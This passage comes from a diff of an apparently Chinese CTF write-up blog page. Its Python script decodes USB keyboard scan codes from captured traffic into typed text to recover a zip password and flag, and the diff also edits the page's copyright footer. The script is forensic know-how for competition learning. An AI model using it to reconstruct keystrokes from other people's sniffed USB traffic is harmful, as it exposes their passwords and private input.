<span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">'[unknown]'</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure></p>
 <p>得到：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327172600480.png" alt="在这里插入图片描述"><br>在vim中敲入对应的按键得到：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327172659487.png" alt="在这里插入图片描述"><br>可能哪里敲错了(应该是honk和Of)，得到压缩包的密码为：honkover1esOfNanle</p>
 <p>解压得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327172857396.png" alt="在这里插入图片描述"></p>
 
@@ -383,14 +252,9 @@ print (&#39;output :&#39; + &quot;&quot;.join(output))
                 
                     <p class="copyright-item">
                         <span>License:</span>
-                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                     </p>
                 
-                
-                     <p class="copyright-item">
-                         <span>Slogan:</span>
-                         <span>Do you believe in <strong>DESTINY</strong>?</span>
-                     </p>
                 
 
             </section>
